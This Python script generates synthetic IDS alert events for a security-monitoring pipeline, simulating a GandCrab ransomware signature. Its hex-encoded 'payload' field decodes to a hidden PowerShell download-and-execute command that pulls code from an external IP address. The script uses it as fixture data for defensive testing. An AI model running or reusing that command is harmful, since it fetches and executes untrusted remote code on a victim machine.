#!/usr/bin/python3
import argparse
import time
import random
from faker import Faker
from assets import user_devices_2
from sensors import get_random_sensor
from producer import run_producer

# Inicializa Faker para datos sintéticos
fake = Faker()

# Definición de las firmas para el sig_id y sus revisiones (rev)
sig_ids = [
    (2025452, 1, 'ET TROJAN Observed GandCrab Ransomware Domain (ransomware .bit in DNS Lookup)', 'high')
]

# Simulate a ransomware which is checking the machine has internet connection to avoid sandboxing
def generate_event():
  sig_id_data = random.choice(sig_ids)
  src = random.choice(user_devices_2)
  dst = random.choice(["88.198.16.134", '46.17.97.37'])
  return {
    "timestamp": int(time.time()),
    "payload": '636d642e657865202f6320706f7765727368656c6c202d6e6f70202d772068696464656e202d632022494558202828286e65772d6f626a656374206e65742e776562636c69656e74292e646f776e6c6f6164737472696e67282768747470733a2f2f34362e31372e39372e33372f5365727665726d61632e70687027292929220a',
    "sensor_id_snort": 0,
    "action": "alert",
    "sig_generator": 1,
    "sig_id": sig_id_data[0],  # ID del evento
    "rev": sig_id_data[1],  # Revisión asociada al evento
    "priority": sig_id_data[3],
    "msg": sig_id_data[2],  # Descripción del mensaje
    "classification": "Misc activity",
    "l4_proto_name": "udp",
    "l4_proto": 17,
    "src": src.ip,
    "src_name": src.name,
    "ethsrc": src.mac,
    "ethsrc_vendor": src.vendor,
    "ethdst": "00:1a:2f:3d:4b:5e",
    "ethdst_vendor": "cisco systems, inc.",
    "ethtype": 33024,
    "vlan": 30,
    "vlan_name": "30",
    "vlan_priority": 0,
    "vlan_drop": 0,
    "udplength": 72,
    "ethlength": 0,
    "ethlength_range": "0(0-64]",
    "src_port": 48621,
    "src_port_name": "48621",
    "dst_port": 443,
    "dst_port_name": "443",
    "src_asnum": 4110056778,
    "dst_asnum": "3038642698",
    "dst_name": str(dst),
    "dst": dst,
    "ttl": 47,
    "tos": 0,
    "id": 0,
    "iplen": 92,
    "iplen_range": "[64-128)",
    "dgmlen": 92,
    "domain_name": "N/A",
    "index_partitions": 5,
    "index_replicas": 1,
    **get_random_sensor('ips')
  }

if __name__ == "__main__":
  parser = argparse.ArgumentParser()
  parser.add_argument('-d', '--duration', type=int, default=5, help='Duration in seconds (default: 5)')
  args = parser.parse_args()
  run_producer(generate_event, args.duration, topic='rb_event', time_range=(1, 1))
